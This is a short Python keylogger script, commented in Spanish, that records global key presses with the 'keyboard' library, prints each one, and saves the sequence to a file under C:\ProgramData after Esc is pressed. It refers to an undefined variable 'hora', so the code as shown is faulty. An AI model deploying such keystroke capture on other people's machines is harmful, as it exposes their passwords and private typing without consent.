import keyboard
import time 
teclasguardas = []
def registrar(tecla ):
    if tecla == "space": 
        tecla = " "
    elif tecla == "enter": 
        tecla = "[ENTER]"
    elif len(tecla) > 1: 
        tecla = f"[{tecla}]"
    teclasguardas.append(tecla)
    print(f"Tecla {len(teclasguardas)}: {tecla}el tiempo en que que fue pulsada es: {hora}")
    print("La cantidad de teclas presionadas es:", len(teclasguardas))
keyboard.on_press(lambda e: registrar(e.name))
keyboard.wait('esc')

texto = ""
for t in teclasguardas:
    texto += t
with open(r"C:\ProgramData\logs.txt", "w") as f:
    f.write(texto)
print("Registro completo:", texto)
